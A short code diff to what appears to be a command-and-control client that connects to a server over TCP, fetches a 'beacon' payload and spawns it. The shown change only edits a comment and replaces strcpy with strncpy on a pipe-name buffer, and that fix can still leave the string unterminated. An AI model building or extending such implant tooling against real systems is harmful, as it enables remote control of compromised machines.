@@ -163,7 +163,7 @@ void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
 
 
 /**
- * Main function. Connects to IRC server over TCP, gets beacon and spawns it, then enters send/recv loop
+ * Main function. Connects to server over TCP, gets beacon and spawns it, then enters send/recv loop
  *
  */
 void main(int argc, char* argv[])
@@ -184,7 +184,7 @@ void main(int argc, char* argv[])
 	char* PORT = argv[2];
 	
 	char pipe_str[50];
-	strcpy(pipe_str, argv[3]);
+	strncpy(pipe_str, argv[3], sizeof(pipe_str));
 
 	DWORD payloadLen = 0;
 	char* payloadData = NULL;
